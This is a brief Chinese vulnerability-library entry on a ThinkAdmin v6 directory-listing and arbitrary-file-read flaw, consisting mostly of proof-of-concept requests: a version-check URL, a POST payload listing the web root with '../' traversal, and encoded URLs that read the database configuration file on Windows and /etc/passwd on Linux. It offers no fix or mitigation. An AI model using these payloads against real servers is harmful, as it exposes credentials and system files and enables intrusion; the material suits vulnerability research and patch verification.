---
title: 'ThinkAdmin v6 列目录任意文件读取'
date: Wed, 16 Sep 2020 09:56:04 +0000
draft: false
tags: ['白阁-漏洞库']
---

ThinkAdmin v6 列目录任意文件读取 V5前，直接也能读取 列目录 poc: version()可以获取到当前版本：2020.08.03.01，≤这个版本的都有可能存在漏洞 http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version 读取网站根目录Payload: http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node post:rules=\["/"\] 也可以使用../来进行目录穿越-》 rules=\["../../../"\] 任意文件读取 需要进行encode() 加密一下字符串 On Windows read database.php payload:```
database.php   =>  public/static/../../config/database"php
/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 
```On Linux read /etc/passwd payload:```
/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s 
```